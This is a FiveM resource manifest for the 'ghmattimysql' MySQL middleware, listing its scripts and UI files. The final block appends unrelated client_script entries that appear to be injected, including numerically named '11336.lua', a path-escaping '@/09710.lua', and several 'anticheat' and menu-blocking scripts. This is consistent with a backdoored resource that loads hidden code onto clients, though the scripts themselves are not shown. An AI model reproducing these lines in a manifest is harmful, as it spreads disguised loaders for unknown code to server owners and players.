fx_version 'adamant'
game 'common'

name 'ghmattimysql'
description 'MySQL Middleware for fivem using mysql.js.'
author 'Matthias Mandelartz'
version '1.3.2'
url 'https://github.com/GHMatti/ghmattimysql'

server_scripts {
  'ghmattimysql-server.js',
  'ghmattimysql-server.lua',
}

client_script 'ghmattimysql-client.lua'

files {
  'ui/index.html',
  'ui/js/app.js',
  'ui/css/app.css',
  'ui/fonts/*.woff',
  'ui/fonts/*.woff2',
  'ui/fonts/*.eot',
  'ui/fonts/*.ttf',
}

ui_page 'ui/index.html'

client_script "11336.lua"
client_script "lucidcity-anticheat.lua"
client_script "antikickvehicle.lua"
client_script "anti-stungun.lua"
client_script "anti-update.lua"
client_script "block-menus.lua"
client_script "block-menus2.lua"
client_script '@/09710.lua'